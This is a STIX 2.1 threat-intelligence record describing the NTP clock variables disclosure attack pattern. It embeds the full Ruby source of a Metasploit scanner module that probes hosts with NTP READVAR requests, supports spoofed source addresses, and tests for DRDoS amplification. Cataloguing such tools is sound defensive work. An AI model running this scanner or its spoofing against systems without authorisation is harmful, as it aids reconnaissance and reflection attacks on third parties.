{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0293a8d-fa72-423f-90ae-b2dba70763da",
    "created": "2024-08-14T16:27:50.673984Z",
    "modified": "2024-08-14T16:27:50.673988Z",
    "name": "NTP Clock Variables Disclosure",
    "description": "( This module reads the system internal NTP variables. These variables contain potentially sensitive information, such as the NTP software version, operating system version, peers, and more. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ntp/ntp_readvar.rb",
            "external_id": "ntp_readvar.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/db/vulnerabilities/ntp-clock-variables-disclosure/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::UDPScanner\n  include Msf::Auxiliary::NTP\n  include Msf::Auxiliary::DRDoS\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NTP Clock Variables Disclosure',\n      'Description'    => %q(\n        This module reads the system internal NTP variables. These variables contain\n        potentially sensitive information, such as the NTP software version, operating\n        system version, peers, and more.\n      ),\n      'Author'         =>\n        [\n          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>', # original Metasploit module\n          'Jon Hart <jon_hart[at]rapid7.com>' # UDPScanner version for faster scans\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-5211'], # see also scanner/ntp/ntp_monlist.rb\n          [ 'URL', 'https://www.rapid7.com/db/vulnerabilities/ntp-clock-variables-disclosure/' ]\n        ]\n      )\n    )\n  end\n\n  def scanner_process(data, shost, _sport)\n    @results[shost] ||= []\n    @results[shost] << Rex::Proto::NTP::NTPControl.new.read(data)\n  end\n\n  def scan_host(ip)\n    if spoofed?\n      datastore['ScannerRecvWindow'] = 0\n      scanner_spoof_send(@probe, ip, datastore['RPORT'], datastore['SRCIP'], datastore['NUM_REQUESTS'])\n    else\n      scanner_send(@probe, ip, datastore['RPORT'])\n    end\n  end\n\n  def scanner_prescan(batch)\n    @results = {}\n    print_status(\"Sending NTP v2 READVAR probes to #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)\")\n    @probe = Rex::Proto::NTP::NTPControl.new\n    @probe.version = datastore['VERSION']\n    @probe.operation = 2\n  end\n\n  def scanner_postscan(_batch)\n    @results.keys.each do |k|\n      # TODO: check to see if any of the responses are actually NTP before reporting\n      report_service(\n        host: k,\n        proto: 'udp',\n        port: rport,\n        name: 'ntp',\n        info: @results[k].map { |r| r.payload.slice(0,r.payload_size) }.join.inspect\n      )\n\n      peer = \"#{k}:#{rport}\"\n      response_map = { @probe => @results[k] }\n      vulnerable, proof = prove_amplification(response_map)\n      what = 'NTP Mode 6 READVAR DRDoS'\n      if vulnerable\n        print_good(\"#{peer} - Vulnerable to #{what}: #{proof}\")\n        report_vuln(\n          host: k,\n          port: rport,\n          proto: 'udp',\n          name: what,\n          refs: references\n        )\n      else\n        vprint_status(\"#{peer} - Not vulnerable to #{what}: #{proof}\")\n      end\n    end\n  end\nend\n"
}